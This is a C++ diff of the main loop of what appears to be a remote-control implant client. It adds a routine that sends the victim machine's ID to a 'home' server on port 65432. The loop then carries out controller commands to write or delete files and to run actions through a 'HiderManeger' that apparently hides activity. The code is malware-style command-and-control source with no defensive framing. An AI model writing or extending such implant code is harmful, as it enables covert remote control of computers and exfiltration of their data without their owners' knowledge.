@@ -11,11 +11,13 @@
 #include "Connection.h"
 #include "SocketConnection.h"
 #include "../IncludeCPP/globalDefines.h"
+#include "../IncludeCPP/getBasicInfo.h"
 
 #define PORT (65432)
 
 void loopIter(std::shared_ptr<SocketConnection> conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
-void testSoftwareManeger(void);
+
+int initRun(std::shared_ptr<SocketConnection> conn);
 
 int main() {
     
@@ -28,6 +30,7 @@ int main() {
     }
 
 
+
     bool cont = true;
     while (cont)
     {
@@ -38,6 +41,18 @@ int main() {
     return EXIT_SUCCESS;
 }
 
+// perform stuff after connection to home creation
+// meant for sending information required for operation
+int initRun(std::shared_ptr<SocketConnection> conn) {
+
+
+    if (conn->sendString(getMachineID(), true) == false) {
+        std::cerr << "error sending machine id" << std::endl;
+        exit(EXIT_FAILURE);
+    }
+
+    return 0;
+}
 
 
 
@@ -70,9 +85,9 @@ void loopIter(std::shared_ptr<SocketConnection> conn, SoftwareManeger& swm, Hide
     switch (cmd.fncode)
     {
     case WRITE_FILE:
-        // std::cout << "start write_file\n";
+        std::cout << "start write_file\n";
         res = swm.fileWrite(conn, cmd.dataLen, strParam);
-        // std::cout << "finnish write_file\n";
+        std::cout << "finnish write_file\n";
         break;
 
     case DELETE_FILE:
@@ -98,7 +113,7 @@ void loopIter(std::shared_ptr<SocketConnection> conn, SoftwareManeger& swm, Hide
         res = hiderManeger.hiddenAction(cmd, conn);
     }
     
-    // TODO change such that there will be response only if we want it to be
+    // TODO change such that there will be response only if we want it to be 
     conn->flushInput();
     std::cout << "Conn: res-" << res << " response-\n" << strRes << std::endl;
     conn->sendResponce(res, strRes);
